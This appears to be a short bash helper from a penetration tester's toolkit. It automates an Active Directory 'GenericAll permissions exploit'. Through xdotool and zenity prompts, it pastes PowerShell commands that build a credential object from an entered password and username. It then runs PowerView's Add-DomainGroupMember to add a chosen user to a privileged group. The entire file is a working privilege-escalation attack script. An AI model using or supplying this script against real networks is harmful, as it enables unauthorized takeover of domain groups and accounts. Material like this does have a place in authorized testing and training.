#!/bin/bash

"""
powershell: genericAll permissions exploit
"""

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

PASSWORD=$(zenity --entry --title="Password" --text="Enter password:")
paste_command "\$SecPassword = ConvertTo-SecureString '${PASSWORD}' -AsPlainText -Force"
xdotool key Return
sleep 1.5

USERNAME=$(zenity --entry --title="Domain\Username" --text="Enter username:")
paste_command "\$creds = New-Object System.Management.Automation.PSCredential('${USERNAME}', \$SecPassword)"
xdotool key Return
sleep 1.5


GROUP=$(zenity --entry --title="Group" --text="Enter group name:")
paste_command "\$group = Convert-NameToSid '${GROUP}'"
xdotool key Return
sleep 1.5

MEMBER=$(zenity --entry --title="Member" --text="Enter member user:")
paste_command "Add-DomainGroupMember -Identity \$group -Members '${MEMBER}' -Credential \$creds -verbose"
xdotool key Return
sleep 1.5
